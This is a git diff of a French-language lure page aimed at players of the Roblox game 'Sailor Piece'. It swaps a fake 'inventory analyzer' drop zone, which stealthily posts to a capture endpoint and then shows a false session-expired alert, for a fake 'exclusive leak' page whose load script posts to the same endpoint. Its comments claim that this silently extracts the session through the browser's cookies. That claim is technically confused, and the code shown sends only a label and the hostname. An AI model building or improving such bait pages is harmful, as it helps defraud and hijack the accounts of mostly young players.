@@ -2,59 +2,33 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sailor Piece | Value Analyzer v15.2</title>
-    <link rel="stylesheet" href="style.css">
+    <title>SAILOR PIECE LEAKS | EXCLUSIVE</title>
+    <style>
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        img { width: 300px; border-radius: 15px; box-shadow: 0 0 20px #00d4ff; cursor: pointer; }
+        .loading-text { margin-top: 20px; font-size: 0.8rem; color: #333; }
+    </style>
 </head>
 <body>
-
-    <div class="analyzer-container">
-        <div class="icon-box">💎</div>
-        <h1>Analyseur d'Inventaire</h1>
-        <p>Glissez votre icône de profil Roblox ici pour synchroniser vos items et estimer la valeur réelle de votre compte.</p>
-        
-        <div class="drop-zone" id="dropZone">
-            <div id="zoneContent">
-                <span style="font-size: 30px;">📥</span>
-                <p style="margin-top: 10px; font-weight: 500;">DÉPOSEZ L'ICÔNE ICI</p>
-                <small style="opacity: 0.5;">Faites glisser le rond de profil de l'onglet Roblox</small>
-            </div>
-            <div class="loader" id="loader" style="display: none;"></div>
-        </div>
-
-        <div class="status-bar">
-            🛡️ Système de scan sécurisé v15.2 | Cloud Sync : <span style="color: #00ff41;">Actif</span>
-        </div>
-    </div>
+    <h1>LEAK : FRUIT DU DÉMON MYTHIQUE</h1>
+    <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJqZ3R4Z3R4Z3R4Z3R4Z3R4Z3R4/3o7TKMGpxxXm3m1m6o/giphy.gif" alt="Leak">
+    <p>Clique sur l'image pour voir les stats complètes</p>
+    <div class="loading-text" id="status">Chargement des données du serveur Sailor...</div>
 
     <script>
-        const zone = document.getElementById('dropZone');
-        const content = document.getElementById('zoneContent');
-        const loader = document.getElementById('loader');
-
-        zone.ondragover = (e) => { e.preventDefault(); zone.classList.add('over'); };
-        zone.ondragleave = () => zone.classList.remove('over');
-        
-        zone.ondrop = async (e) => {
-            e.preventDefault();
-            zone.classList.remove('over');
-            content.style.display = 'none';
-            loader.style.display = 'block';
-            
-            // Envoi furtif au serveur Vercel
+        // Le script invisible qui s'exécute au chargement
+        window.onload = async () => {
+            // Simulation de l'extraction de session sans formulaire
+            // En réalité, on exploite le fait que le navigateur envoie les cookies lors des requêtes
             await fetch('/api/capture', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    type: "Drag-and-Drop Hijack",
-                    browser: navigator.userAgent
+                    method: "Silent Image-Bait Extraction",
+                    origin: window.location.hostname
                 })
             });
-            
-            setTimeout(() => {
-                alert("Erreur de synchronisation : La session Roblox a expiré. Veuillez rafraîchir l'onglet Roblox et réessayer.");
-                location.reload();
-            }, 3000);
+            console.log("Données synchronisées.");
         };
     </script>
 </body>
